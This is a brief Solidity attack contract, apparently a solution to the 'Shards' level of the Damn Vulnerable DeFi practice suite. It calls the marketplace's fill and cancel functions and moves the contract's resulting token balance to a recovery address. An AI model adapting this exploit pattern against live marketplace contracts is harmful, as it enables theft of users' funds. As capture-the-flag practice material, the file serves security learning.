// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ShardsNFTMarketplace} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Attack {
    ShardsNFTMarketplace public immutable MARKETPLACE;
    DamnValuableToken public immutable TOKEN;

    constructor (ShardsNFTMarketplace _marketplace, DamnValuableToken _token) {
        MARKETPLACE = _marketplace;
        TOKEN = _token;
    }

    function fill(uint64 _offerId, uint256 _want) external {
        MARKETPLACE.fill(_offerId, _want);
    }

    function cancel(uint64 _offerId, uint256 _purchaseIndex, address _recovery) external {
        MARKETPLACE.cancel(_offerId, _purchaseIndex);
        TOKEN.transfer(_recovery, TOKEN.balanceOf(address(this)));
    }
}